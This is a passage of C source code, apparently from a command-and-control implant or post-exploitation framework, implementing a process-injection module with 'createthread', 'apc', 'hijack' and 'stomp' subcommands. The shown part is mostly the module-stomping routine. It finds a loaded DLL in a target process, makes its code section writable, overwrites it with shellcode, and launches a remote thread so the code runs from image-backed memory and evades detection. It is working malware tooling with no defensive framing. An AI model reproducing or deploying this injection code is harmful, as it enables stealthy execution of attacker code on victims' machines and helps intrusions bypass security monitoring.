                if (!NT_SUCCESS(status) || next_link == first_link ||
                    next_link == current_link || !next_link)
                    break;

                current_link = next_link;
                walk_count++;
            }
        }

        if (!dll_base) {
            api->proc_close(hProc);
            {
                char out[128];
                DWORD off = 0;
                off = buf_append(out, sizeof(out), off,
                                  "inject stomp: DLL not found in target: ");
                off = buf_append(out, sizeof(out), off, dll_name);
                api->output((const BYTE *)out, (DWORD)spec_strlen(out), OUTPUT_ERROR);
            }
            return MODULE_ERR_IO;
        }

        /* Found the DLL, now parse its PE headers to find .text section */
        {
            BYTE dos_hdr[64];   /* IMAGE_DOS_HEADER */
            LONG e_lfanew;
            BYTE nt_hdr[264];   /* IMAGE_NT_HEADERS64 (24 + 240) */
            WORD num_sections;
            PVOID section_table_addr;
            PVOID text_addr = NULL;
            DWORD text_size = 0;
            DWORD si;

            /* Read DOS header */
            status = pNtReadVirtualMemory(hProc, dll_base, dos_hdr,
                                           sizeof(dos_hdr), &bytes_read);
            if (!NT_SUCCESS(status) || *(WORD *)dos_hdr != IMAGE_DOS_SIGNATURE) {
                api->proc_close(hProc);
                MODULE_OUTPUT_ERROR(api, "inject stomp: invalid DOS header in target DLL");
                return MODULE_ERR_IO;
            }

            e_lfanew = *(LONG *)(dos_hdr + 60);  /* offset 0x3C */

            /* Read NT headers */
            status = pNtReadVirtualMemory(hProc,
                (PVOID)((ULONG_PTR)dll_base + e_lfanew),
                nt_hdr, sizeof(nt_hdr), &bytes_read);
            if (!NT_SUCCESS(status) || *(DWORD *)nt_hdr != IMAGE_NT_SIGNATURE) {
                api->proc_close(hProc);
                MODULE_OUTPUT_ERROR(api, "inject stomp: invalid NT header in target DLL");
                return MODULE_ERR_IO;
            }

            /* Number of sections: offset 6 in NT headers (FileHeader.NumberOfSections) */
            num_sections = *(WORD *)(nt_hdr + 6);

            /* Section table follows optional header:
             * NT sig (4) + FileHeader (20) + SizeOfOptionalHeader */
            {
                WORD opt_hdr_size = *(WORD *)(nt_hdr + 20);
                section_table_addr = (PVOID)((ULONG_PTR)dll_base + e_lfanew +
                                              4 + 20 + opt_hdr_size);
            }

            /* Walk sections to find .text (or executable section) */
            for (si = 0; si < num_sections && si < 64; si++) {
                BYTE sec_hdr[40];   /* IMAGE_SECTION_HEADER = 40 bytes */
                DWORD sec_chars;

                status = pNtReadVirtualMemory(hProc,
                    (PVOID)((ULONG_PTR)section_table_addr + si * 40),
                    sec_hdr, sizeof(sec_hdr), &bytes_read);
                if (!NT_SUCCESS(status))
                    continue;

                sec_chars = *(DWORD *)(sec_hdr + 36);   /* Characteristics */

                /* Check if it's a code section */
                if ((sec_chars & IMAGE_SCN_CNT_CODE_) &&
                    (sec_chars & IMAGE_SCN_MEM_EXECUTE_)) {
                    DWORD vaddr = *(DWORD *)(sec_hdr + 12);  /* VirtualAddress */
                    DWORD vsize = *(DWORD *)(sec_hdr + 8);   /* VirtualSize */

                    text_addr = (PVOID)((ULONG_PTR)dll_base + vaddr);
                    text_size = vsize;
                    break;
                }
            }

            if (!text_addr || text_size == 0) {
                api->proc_close(hProc);
                MODULE_OUTPUT_ERROR(api, "inject stomp: no .text section found in target DLL");
                return MODULE_ERR_IO;
            }

            /* Verify shellcode fits in .text */
            if (sc_len > text_size) {
                api->proc_close(hProc);
                MODULE_OUTPUT_ERROR(api, "inject stomp: shellcode larger than .text section");
                return MODULE_ERR_ARGS;
            }

            /* Change .text to RWX temporarily */
            {
                PVOID protect_addr = text_addr;
                SIZE_T protect_size = (SIZE_T)text_size;
                DWORD old_protect = 0;

                status = pNtProtectVirtualMemory(hProc, &protect_addr,
                    &protect_size, PAGE_EXECUTE_READWRITE, &old_protect);
                if (!NT_SUCCESS(status)) {
                    api->proc_close(hProc);
                    MODULE_OUTPUT_ERROR(api, "inject stomp: cannot change .text protection");
                    return MODULE_ERR_ACCESS;
                }
            }

            /* Write shellcode over .text */
            if (!api->proc_write(hProc, text_addr, shellcode, sc_len)) {
                api->proc_close(hProc);
                MODULE_OUTPUT_ERROR(api, "inject stomp: failed to write shellcode to .text");
                return MODULE_ERR_IO;
            }

            /* Restore to RX */
            {
                PVOID protect_addr = text_addr;
                SIZE_T protect_size = (SIZE_T)text_size;
                DWORD old_protect = 0;

                pNtProtectVirtualMemory(hProc, &protect_addr, &protect_size,
                                         PAGE_EXECUTE_READ, &old_protect);
            }

            /* Create thread at .text base — execution starts in image-backed memory */
            {
                HANDLE hNewThread = NULL;

                status = pNtCreateThreadEx(&hNewThread, THREAD_ALL_ACCESS, NULL,
                                            hProc, text_addr, NULL, 0, 0, 0, 0, NULL);
                if (!NT_SUCCESS(status) || !hNewThread) {
                    api->proc_close(hProc);
                    MODULE_OUTPUT_ERROR(api, "inject stomp: NtCreateThreadEx failed");
                    return MODULE_ERR_IO;
                }

                if (pNtClose) pNtClose(hNewThread);
            }

            api->proc_close(hProc);

            {
                char out[192];
                DWORD off = 0;
                off = buf_append(out, sizeof(out), off, "inject stomp: ");
                off = buf_append(out, sizeof(out), off, dll_name);
                off = buf_append(out, sizeof(out), off, " .text overwritten (");
                off = buf_append_uint(out, sizeof(out), off, sc_len);
                off = buf_append(out, sizeof(out), off, "/");
                off = buf_append_uint(out, sizeof(out), off, text_size);
                off = buf_append(out, sizeof(out), off, " bytes) in PID ");
                off = buf_append_uint(out, sizeof(out), off, pid);
                off = buf_append(out, sizeof(out), off, " at ");
                off = buf_append_hex(out, sizeof(out), off, (QWORD)(ULONG_PTR)text_addr);
                MODULE_OUTPUT_TEXT(api, out);
            }
        }
    }

    return MODULE_SUCCESS;
}

/* ------------------------------------------------------------------ */
/*  Module entry point                                                 */
/* ------------------------------------------------------------------ */

DWORD module_entry(MODULE_BUS_API *api, BYTE *args_raw, DWORD args_len)
{
    MODULE_ARGS  args;
    const char  *subcmd;

    if (!module_parse_args(args_raw, args_len, &args)) {
        MODULE_OUTPUT_ERROR(api, "inject: failed to parse arguments");
        return MODULE_ERR_ARGS;
    }

    subcmd = module_arg_string(&args, 0);
    if (!subcmd) {
        MODULE_OUTPUT_ERROR(api, "inject: missing subcommand (createthread|apc|hijack|stomp)");
        return MODULE_ERR_ARGS;
    }

    if (spec_strcmp(subcmd, "createthread") == 0)
        return cmd_createthread(api, &args);

    if (spec_strcmp(subcmd, "apc") == 0)
        return cmd_apc(api, &args);

    if (spec_strcmp(subcmd, "hijack") == 0)
        return cmd_hijack(api, &args);

    if (spec_strcmp(subcmd, "stomp") == 0)
        return cmd_stomp(api, &args);

    MODULE_OUTPUT_ERROR(api, "inject: unknown subcommand");
    return MODULE_ERR_UNSUPPORTED;
}
